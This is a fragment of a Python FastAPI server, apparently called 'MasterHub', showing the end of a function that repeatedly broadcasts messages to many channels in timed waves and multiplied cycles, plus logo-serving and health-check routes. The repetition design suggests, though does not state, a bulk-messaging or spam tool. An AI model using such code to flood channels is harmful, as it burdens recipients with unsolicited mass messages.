                    except Exception as e:
                        print(f"Error sending to {channel.name}: {e}")
                        wave_errors += 1
                        error_count += 1
                        broadcast_control[broadcast_id]["failed_count"] = error_count

                # Break out of wave loop if killed
                if not broadcast_control.get(broadcast_id, {}).get("running", False):
                    break

                print(
                    f"Cycle {cycle + 1}, Wave {wave + 1} complete: {wave_success} sent, {wave_errors} failed"
                )

                # Add delay between waves (except for the last wave in the cycle)
                if wave < request.wave_count - 1:
                    print(
                        f"Waiting {request.delay_between_waves}s before next wave..."
                    )
                    await asyncio.sleep(request.delay_between_waves)

            # Break out of cycle loop if killed
            if not broadcast_control.get(broadcast_id, {}).get("running", False):
                break

            # Add delay between multiplier cycles (except for the last cycle)
            if cycle < request.multiplier - 1:
                print(
                    f"Waiting {request.delay_between_multiplier_cycles}s before next cycle..."
                )
                await asyncio.sleep(request.delay_between_multiplier_cycles)

        # Clean up broadcast control
        was_killed = not broadcast_control.get(broadcast_id, {}).get("running", False)
        if broadcast_id in broadcast_control:
            del broadcast_control[broadcast_id]

        status_message = "killed by user" if was_killed else "completed"
        print(
            f"Broadcast {status_message}: {success_count}/{total_messages} messages sent"
        )

        return {
            "success": True,
            "total_sent": success_count,
            "total_failed": error_count,
            "waves_completed": request.wave_count * request.multiplier,
            "total_cycles": request.multiplier,
            "channels_reached": len(channels),
            "total_messages": total_messages,
            "was_killed": was_killed,
            "broadcast_id": broadcast_id
        }

    except Exception as e:
        # Clean up broadcast control on error
        if broadcast_id in broadcast_control:
            del broadcast_control[broadcast_id]
        print(f"Broadcast error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# Health check endpoint for Vercel
@app.get("/templates/giphy.gif")
async def serve_logo():
    """Serve the logo GIF file"""
    import os
    # Try multiple possible paths for the GIF
    gif_paths = [
        'giphy.gif',
        'api/giphy.gif', 
        'templates/giphy.gif',
        '../templates/giphy.gif',
        os.path.join(os.path.dirname(__file__), 'giphy.gif')
    ]
    
    for gif_path in gif_paths:
        if os.path.exists(gif_path):
            return FileResponse(gif_path, media_type="image/gif")
    
    # Fallback - return 404 if not found
    raise HTTPException(status_code=404, detail="Logo file not found")


@app.get("/api/health")
async def health():
    return {"status": "healthy", "service": "MasterHub"}


# For Vercel deployment
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
